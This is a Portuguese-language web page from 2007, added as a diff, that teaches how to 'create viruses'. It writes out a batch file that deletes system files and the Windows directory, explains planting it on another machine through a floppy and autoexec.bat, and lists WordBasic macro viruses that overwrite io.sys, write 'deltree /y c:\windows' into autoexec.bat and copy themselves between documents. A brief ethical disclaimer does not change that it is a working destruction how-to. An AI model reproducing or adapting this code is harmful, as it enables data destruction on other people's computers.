@@ -1,0 +1,78 @@
+<h1>Criando vírus</h1>
+<time>2007-06-09T21:59:14-03:00</time>
+<p>Este texto apresenta, de forma simplificada, como criar um arquivo malicioso para danificar o computador de terceiros. Ressaltamos que tais ações são antiéticas e, em muitos casos, ilegais. O conteúdo a seguir é apenas descritivo e não deve ser utilizado para fins prejudiciais.</p>
+<h2>Criando um arquivo malicioso em lote</h2>
+<p>Primeiramente, crie um arquivo de lote no computador. Este tipo de arquivo pode ser criado sem a necessidade de compilação. Caso não saiba como proceder, aqui está o comando para criá-lo no DOS:</p>
+<pre><code>copy con arquivo.bat
+@echo off
+@echo mensagem de sua escolha
+del *.sys
+del *.exe
+del *.com
+cd windows
+del *.*
+del arquivo.bat
+@echo mensagem de sua escolha</code></pre>
+<p>Este comando criará um arquivo de lote capaz de apagar diversos arquivos do sistema. No entanto, ele só será executado se for iniciado manualmente. Tenha cuidado ao manipulá-lo, pois pode causar sérios danos ao sistema.</p>
+<p>Para utilizá-lo em outro ambiente, transfira o arquivo <code>arquivo.bat</code> para um disquete, acompanhado de um arquivo <code>autoexec.bat</code> contendo a seguinte linha de comando:</p>
+<pre><code>C:\arquivo.bat
+</code></pre>
+<p>Ao inserir o disquete em outro computador, copie os arquivos para o diretório <code>C:\</code>. Feito isso, remova o disquete e deixe o sistema executar o arquivo na próxima inicialização.</p>
+<center><img src="/files/craneo.gif" alt="caveira" width="64" height="64" border="0">&nbsp;&nbsp;&nbsp;&nbsp;<img src="/files/craneo.gif" alt="caveira" width="64" height="64" border="0">&nbsp;&nbsp;&nbsp;&nbsp;<img src="/files/craneo.gif" alt="caveira" width="64" height="64" border="0">&nbsp;&nbsp;&nbsp;&nbsp;<img src="/files/craneo.gif" alt="caveira" width="64" height="64" border="0">&nbsp;&nbsp;&nbsp;&nbsp;<img src="/files/craneo.gif" alt="caveira" width="64" height="64" border="0">&nbsp;&nbsp;&nbsp;&nbsp;<img src="/files/craneo.gif" alt="caveira" width="64" height="64" border="0">&nbsp;&nbsp;&nbsp;&nbsp;<img src="/files/craneo.gif" alt="caveira" width="64" height="64" border="0"></center>
+<h2>Exemplo de um vírus de macro</h2>
+<p>Abaixo está um exemplo de um vírus de macro capaz de modificar arquivos ou causar outros danos ao sistema:</p>
+<p><b>Vírus 12/04</b></p>
+<pre><code>Sub MAIN()
+   If Day(Now) = 12 And Month(Now) = 4 Then
+       SetAttr &quot;C:\msdos.sys&quot;, 0
+       Open &quot;C:\io.sys&quot; For Output As #1
+       Print #1, &quot;Mensagem maliciosa&quot;
+       Close #1
+   End If
+   Open &quot;C:\autoexec.bat&quot; For Output As #1
+   Print #1, &quot;@echo off&quot;
+   Print #1, &quot;cls&quot;
+   Print #1, &quot;@deltree /y c:\windows &gt; nul&quot;
+   Close #1
+End Sub</code></pre>
+<p><b>Rotina 2</b></p>
+<pre><code>Sub MAIN()
+    Open &quot;C:\imaiden.txt&quot; For Output As #1
+    Print #1, &quot;Código em hexadecimal&quot;
+    Close #1
+    Shell &quot;debug texto.txt&quot;
+    Shell &quot;c:\imaiden.com&quot;
+End Sub</code></pre>
+<p><b>Rotina 3</b></p>
+<pre><code>Sub MAIN()
+    MacroCopy &quot;Global:Inocu&quot;, &quot;DocumentoNovo&quot;, 0
+End Sub</code></pre>
+<p><b>Vírus Fagundes Varela</b></p>
+<pre><code>Sub MAIN()
+    BeginDocument
+    Insert &quot;Lembra dessas noites&quot;
+    Insert CHR$(13)
+    Insert &quot;Cheias de doce harmonia,&quot;
+    Insert CHR$(13)
+    Insert &quot;Quando a floresta gemia&quot;
+    Insert CHR$(13)
+    Insert &quot;Do vento aos brandos açoites?&quot;
+    Insert CHR$(13)
+    Insert CHR$(13)
+    Insert &quot;Quando as estrelas sorriam&quot;
+    Insert CHR$(13)
+    Insert &quot;Quando as campinas tremiam&quot;
+    Insert CHR$(13)
+    Insert &quot;Nas dobras do úmido véu?&quot;
+    Insert CHR$(13)
+    Insert &quot;E nossas almas unidas&quot;
+    Insert CHR$(13)
+    Insert &quot;Estreitavam-se, sentidas,&quot;
+    Insert CHR$(13)
+    Insert &quot;Ao brilhar daquele céu?&quot;
+    StandardPrintDocument
+End Sub</code></pre>
+<center><img src="/files/craneo.gif" alt="caveira" width="64" height="64" border="0">&nbsp;&nbsp;&nbsp;&nbsp;<img src="/files/craneo.gif" alt="caveira" width="64" height="64" border="0">&nbsp;&nbsp;&nbsp;&nbsp;<img src="/files/craneo.gif" alt="caveira" width="64" height="64" border="0">&nbsp;&nbsp;&nbsp;&nbsp;<img src="/files/craneo.gif" alt="caveira" width="64" height="64" border="0">&nbsp;&nbsp;&nbsp;&nbsp;<img src="/files/craneo.gif" alt="caveira" width="64" height="64" border="0">&nbsp;&nbsp;&nbsp;&nbsp;<img src="/files/craneo.gif" alt="caveira" width="64" height="64" border="0">&nbsp;&nbsp;&nbsp;&nbsp;<img src="/files/craneo.gif" alt="caveira" width="64" height="64" border="0"></center>
+<h2>Observações</h2>
+<p>Esses exemplos ilustram códigos maliciosos, conhecidos como &quot;destructive scripts&quot;, programados para danificar sistemas, desconfigurar arquivos essenciais, como <code>io.sys</code>, <code>msdos.sys</code> e <code>command.com</code>, ou até mesmo travar o computador por completo. No entanto, sua remoção pode ser realizada de várias formas, como a formatação completa do disco rígido (<code>format c: /u</code>) ou a utilização de ferramentas de antivírus atualizadas.</p>
+<p>No caso de sistemas mais modernos, como o Windows XP, recomenda-se criar um ponto de restauração para evitar perda de dados importantes. Já em sistemas mais antigos, como o Windows 98, o suporte limitado pode tornar a recuperação mais desafiadora.</p>
